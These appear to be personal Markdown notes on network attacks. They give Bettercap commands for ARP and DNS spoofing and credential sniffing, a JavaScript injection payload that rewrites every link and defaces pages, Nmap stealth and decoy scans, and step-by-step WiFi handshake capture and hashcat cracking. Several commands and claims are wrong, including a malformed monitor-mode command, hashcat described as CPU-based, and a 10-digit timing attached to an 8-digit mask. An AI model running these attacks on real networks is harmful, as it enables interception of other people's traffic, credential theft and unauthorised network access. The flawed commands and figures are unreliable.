# Network-based Tools and Techniques

## [Bettercap](https://www.bettercap.org/)

- Implements MITM attacks

Detect network devices
```
net.probe on
```
List all devices
```
net.show
```
### ARP Spoofing
- Redirects the traffic as `Target → Attacker → Router`
- HTTP websites can directly capture your credentials
```
set arp.spoof.targets <IP>
arp.spoof on
```
### Sniffing
```
net.sniff on
net.sniff off
```
### DNS Spoofing
- Redirects the victim to an attacker controlled page
- Start your attacker server `service apache2 start`
```
set dns.spoof.domains <URL>
dns.spoof on
```
### Redirecting
```js
window.onload = function() {
    console.log("Hacked website");
    anchors = document.getElementsByTagName("a");
    for (var i = 0; i < anchors.length; i++) {
        anchors[i].href = 'https://www.hackthissite.org/'; // redirect all links to this website
    }
    document.write("<h1> You have been hacked </h1>"); // modify contents of the HTTP website entirely
}
```
- Set HTTP Proxy before redirectiong
```set http.proxy.injectjs ./<your-javascript.js>
http.proxy on
```
- Turn off proxy after any changes to the script and back on for the changes to take effect

## [Nmap](https://nmap.org/)
- Network scanner - Scan networks to find live hosts / targets / services

1. Check for live systems (ping)
    ```
    $ nmap -sP <IP/24>
    ```
    - Ping 254 possible hosts at once

2. Check for open ports
    ```
    $ nmap -sT -p 80,443 <IP/24>
    ```
    - -sT: TCP connection 3-way handshake (SYN, SYN ACK, ACK) for full-open scan

3. Scan beyond IDS/Firewall
    ```
    $ nmap -sS -p
    ```
    - -sS: stealthy / SYN scan / half-open scan

4. Perform banner grabbing and OS fingerprinting
    ```
    $ nmap -O <IP>
    ```
    - OS detections
    
    ```
    $ nmap -A <IP>
    ```
    - OS detections
    - Version detections
    - Script scanning
    - Traceroute 	

5. Scan for vulnerabilities
6. Draw network diagrams
7. Prepare proxies

### Others
- Decoy
    ```
    $ nmap -sS -D <decoy-IP> 
    ```
- Scripts
    ```
    $ nmap –script vuln <IP>
    ```
- Switches


## [BeEF](https://beefproject.com/)
- The Browser Exploitation Framework used for penetration testing web browsers

## Hacking WiFi passwords

1. Handshake Capture
    - Observe the handshake b/w the device and the router
    - Check the supported interface modes to monitor : `$ iw list`
    - Get name of the adapter : `$ ifconfig`
    - Turn it off : `$ ip link set <adapter-name> down`
    - Set adapter into monitoring mode : `$ sudo <adapter-name> set monitor control`
    - Turn it back on : `$ ip link set <adapter-name> up`
    - Make sure nothing intereferes with us listening
      - Stop Network Manager : `$ sudo systemctl stop NetworkManager`
      - Kill any WiFi managers : `$ sudo airmon-ng check kill`
    - Listen to WiFi network for router's BSSID using `airodump-ng` (A wireless packet capture tools for `aircrack-ng`)
      - `sudo airodump-ng <adapter-name>`
    - Capturing handshake
      - `sudo airodump-ng <adapter-name> -w wpa-capture --bssid <router-bssid> -c 1`
      - This captures the handshake to `cap` files containing password hashes
    - Attacks
      - Brute Force Attack via Hashcat
        - `hashcat` is an advanced CPU-based password recovery utility
        - Convert the `cap` to `pcap` : `editcap -F pcap <cap-file> <output-file>.pcap`
        - Transform `pcap` to hashcat format : `hcxpcapngtool -o hash.hc22000 <output-file>.pcap`
        - Attack Commad : `hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d` --show
        - A simple 10 digit password takes around 11 days on an i7
      - Dictionary Attack
        - 
    
2. Deauthenitication Attack
  - Force the handshake by knocking the devide off the router
3. RSN Attack
  - Capture the packets and brute force the router


Capture wifi handshake 
Crack wifi password using hashcat
Hashcat explained
Password hash cracking
Brute force password
Dictionary attack on password
Password lists from the darkweb
Rule based attack
Hashcat default rules
Hashcat best rules
Wifi deauthentication attack
RSN wifi attack
GCP gpus to crack passwords


#### References
YouTube
- [hacking every device on wifi / ethernet networks 1 #wifi #hack #MITM](https://www.youtube.com/watch?v=2J3idGxCbuc)
- [hacking every device on wifi / ethernet networks 2 #wifi #hack #MITM #javascript](https://www.youtube.com/watch?v=ExxxhioK1Hk)
- [3 wifi attacks and speed hash cracking with cloud GPUs](https://www.youtube.com/watch?v=MrWAJEQJZbk)
